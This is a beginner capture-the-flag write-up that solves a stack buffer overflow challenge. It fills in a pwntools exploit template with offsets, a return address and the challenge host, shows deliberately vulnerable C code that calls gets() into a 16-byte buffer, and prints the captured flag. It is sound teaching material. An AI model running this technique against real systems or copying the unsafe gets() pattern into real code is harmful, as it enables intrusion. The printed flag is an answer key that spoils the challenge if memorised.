# Dat Overflow Dough

```
Pwn

Difficulty: Beginner
Author: 0xjeppe

Our new intern has only coded in memory safe languages, but we're trying to optimize, so he has been tasked with re-writing our dough recipe-application in C!

He sent his code to our senior dev for review who added some comments in the code. Upon receiving the reviewed code, the intern accidentally pushed it to production instead of fixing anything.
```

Attachment:

```python
from pwn import *

# Dear intern, try to put in the correct values for the following variables
# This will show you why your current C-code could leak our secret dough recipe!
RECIPE_BUFFER_SIZE = 0
RBP_SIZE = 0
SECRET_ADDRESS = 0x000000
PROMPT = ""

USE_REMOTE = False
REMOTE_HOST = ""
REMOTE_PORT = 0

"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```

It already gives you the attack script, fill in the details:

```python
RECIPE_BUFFER_SIZE = 16 # char recipe[16]
RBP_SIZE = 8
SECRET_ADDRESS = 0x4011b6 # address of secret_dough_recipe
PROMPT = "Please enter"

USE_REMOTE = True
REMOTE_HOST = "dat-overflow-dough-4e49393e86781b3c.challs.brunnerne.xyz"
REMOTE_PORT = 443
```

```c
// recipe.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void secret_dough_recipe(void) {
    int fd = open("flag.txt", O_RDONLY);
    sendfile(1, fd, NULL, 100);
}

void vulnerable_dough_recipe() {
    char recipe[16];
    puts("Please enter the name of the recipe you want to retrieve:");
    // Using gets() here is NOT a good idea!! We are not checking the size of the input from the user!
    // The recipe-buffer can only store 16 bytes and the user can input more than that. This could lead to buffer overflows.
    // If an attacker has the address of the secret_dough_recipe function, they could exploit this vulnerability to see our secret recipe!!
    gets(recipe);
}

void public_dough_recipe() {
    puts("Here is the recipe for you!");
    puts("3 eggs and some milk");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable_dough_recipe();
    puts("Enjoy baking!");
    return 0;
}
```

Get flag:

```
brunner{b1n4ry_eXpLoiTatioN_iS_CooL}
```
